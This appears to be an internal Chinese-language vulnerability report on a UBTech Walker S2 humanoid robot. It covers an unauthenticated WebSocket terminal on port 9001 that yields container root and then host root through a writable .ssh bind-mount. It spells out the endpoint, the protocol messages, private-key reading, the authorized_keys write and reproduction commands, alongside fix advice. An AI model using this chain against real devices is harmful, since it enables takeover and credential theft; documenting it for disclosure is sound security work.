---
编号: UBH-023
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: udoke未授权WS终端容器Root-RCE-1
---
# UBH-023 UDoke 未授权 WebSocket 终端 → 容器 Root → 宿主 Root（RCE #3）

## 1. 一句话结论

- # UDoke 未授权 WebSocket 终端 → 容器 Root → 宿主 Root（RCE #3）
- ## 漏洞概述
- 任何人只要网络可达 :9001，无需 JWT、无需密码、无需任何凭据，即可对 vision 板上**任意 Docker 容器**以 **root** 身份执行任意命令。叠加容器对宿主 `/home/walker/.ssh` 的 rw bind-mount，可直接取得**宿主 walker 用户 → sudo → 宿主 root**。
- │ 1. 连接  ws://192.168.11.3:9001/ws/slave/terminal/{任意容器}         │  ← 零鉴权
- │ 3. 发送  /userinput <base64(命令)>                                    │  ← 任意命令执行

## 2. 影响产品与版本

- - **受影响组件**：`udoke`（UBT 自研容器编排服务，Rust/actix-web + bollard(Docker API)）
- - **服务**：vision :9001（udoke slave，`/usr/bin/udoke web run --port 9001`，pid 9485）
- \| RCE \| 服务 \| 向量 \| 需要凭据 \| 目标板 \|

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- ## 根因

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # UDoke 未授权 WebSocket 终端 → 容器 Root → 宿主 Root（RCE #3）
- - **受影响组件**：`udoke`（UBT 自研容器编排服务，Rust/actix-web + bollard(Docker API)）
- - **受影响主机**：**vision 板**（192.168.11.3，Jetson T234，hostname=vision）
- 任何人只要网络可达 :9001，无需 JWT、无需密码、无需任何凭据，即可对 vision 板上**任意 Docker 容器**以 **root** 身份执行任意命令。叠加容器对宿主 `/home/walker/.ssh` 的 rw bind-mount，可直接取得**宿主 walker 用户 → sudo → 宿主 root**。
- │ 2. 发送  /connect /bin/sh root 100 100                               │  ← 容器内 root shell
- │ 5. ssh <访问令牌_01>.168.11.3 → sudo (ALL:ALL) ALL → 宿主 root           │

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# UDoke 未授权 WebSocket 终端 → 容器 Root → 宿主 Root（RCE #3）

## 目标 / 范围
- **设备**：UBTech Walker S2 人形机器人（自有研究设备，授权测试）
- **受影响组件**：`udoke`（UBT 自研容器编排服务，Rust/actix-web + bollard(Docker API)）
- **受影响主机**：**vision 板**（192.168.11.3，Jetson T234，hostname=vision）
- **服务**：vision :9001（udoke slave，`/usr/bin/udoke web run --port 9001`，pid 9485）
- **日期**：2026-08-29

## 漏洞概述
`udoke` slave 的 WebSocket 终端端点 **没有任何认证**：

```
ws://192.168.11.3:9001/ws/slave/terminal/{container}
```

任何人只要网络可达 :9001，无需 JWT、无需密码、无需任何凭据，即可对 vision 板上**任意 Docker 容器**以 **root** 身份执行任意命令。叠加容器对宿主 `/home/walker/.ssh` 的 rw bind-mount，可直接取得**宿主 walker 用户 → sudo → 宿主 root**。

## 攻击链（全程零凭据）
```
┌──────────────────────────────────────────────────────────────────────┐
│ 1. 连接  ws://192.168.11.3:9001/ws/slave/terminal/{任意容器}         │  ← 零鉴权
│ 2. 发送  /connect /bin/sh root 100 100                               │  ← 容器内 root shell
│ 3. 发送  /userinput <base64(命令)>                                    │  ← 任意命令执行
│ 4. 写入  /home/ubt/.ssh/authorized_keys = 宿主 walker 的 authorized_keys
│         (容器 bind-mount 宿主 /home/walker/.ssh，rw，字节级同一文件)  │
│ 5. ssh <访问令牌_01>.168.11.3 → sudo (ALL:ALL) ALL → 宿主 root           │
└──────────────────────────────────────────────────────────────────────┘
```

## 关键证据
1. **无鉴权容器 root 命令执行**（`walker-ros.ros2-1`，root 连接成功）：
   ```
   {"code":0,"msg":"Connect terminal successfully"}
   # id; hostname; uname -a; echo PWN3_RCE_WS
   uid=0(root) gid=0(root) groups=0(root)
   vision
   Linux vision 5.15.136-rt-tegra #1 SMP PREEMPT_RT Tue Jan 20 09:47:45 CST 2026 aarch64
   PWN3_RC...
   ```
2. **宿主 SSH 私钥可读**：容器内 `cat /home/ubt/.ssh/id_rsa`（宿主 walker 的私钥，2590B）
3. **宿主 authorized_keys 可写**：备份→追加测试公钥（marker 计数 1）→ 第二容器交叉读回（同一宿主文件）→ 恢复（计数 0，`RESTORED_OK`）
4. **容器/宿主 .ssh 字节级一致**：文件列表与 `id_rsa.pub` 内容完全相同（552/2590/553/1956/1120 字节）
5. **walker 提权**：`groups walker` 含 `sudo docker`；`sudo -l` → `(ALL : ALL) ALL`

完整回显与步骤见 `evidence/verify_terminal_rce3.txt`。

## 影响
- **任意容器内 root**：vision 板上全部容器（`docker ps` 结果）可被任意执行命令
- **宿主 SSH 身份窃取**：读 `/home/walker/.ssh/id_rsa` 私钥
- **宿主 root**：写 `authorized_keys` → `ssh walker@vision` → `sudo -i`
- 附带的容器宿主挂载（`/etc/walker` rw 等）进一步扩大读写面

## 根因
- `udoke` slave 终端 WS（`/ws/slave/terminal/{container}`）**无任何认证**，直接 `docker exec`，且未校验来源
- 大量容器以 **rw** 方式 bind-mount 宿主 `/home/walker/.ssh`

## 复现脚本
```
python scripts/udoke_ws_terminal.py 192.168.11.3:9001 walker-ros.ros2-1
python scripts/udoke_ws_terminal.py 192.168.11.3:9001 walker-system.sys_map_http_manager-1 --command 'cat /home/ubt/.ssh/id_rsa'
```
脚本说明：连接 → `/connect /bin/sh root 100 100` → `/resize` → `/userinput <base64(cmd)>`，默认跑 `id; hostname; uname -a; echo PWN3_RCE_WS`（只读无害验证）。

## 与既有 RCE 的关系（独立性）
| RCE | 服务 | 向量 | 需要凭据 | 目标板 |
|---|---|---|---|---|
| #1 | sysupload HTTP | SFTP 任意写 authorized_keys | 无 | motion |
| #2 | sysupload HTTP | 容器 bind-mount → 宿主 /root/.ssh | 无 | vision |
| **#3（本报告）** | **udoke WS 终端 :9001** | **零鉴权 WS → docker exec → 容器 root → 宿主 .ssh** | **无** | **vision** |

## 修复建议（给厂商）
1. 终端 WS 必须校验身份（登录 JWT / slave token / 来源 IP 白名单），并记录审计日志
2. 容器不得 rw 挂载宿主 `~/.ssh`；改用只读卷或注入最小权限的单独密钥
3. 限制 `docker exec` 的默认用户与能力；`/ws/slave/*` 仅对管理网段开放

## 安全红线遵守
- 全程只读验证 + 无害写验证（authorized_keys 备份后恢复，已确认恢复）
- 未触碰运动控制 topic（`/ecat/*`、`/vnav/task/command`、`/goal`）
- 未发布任何 rosbridge 消息
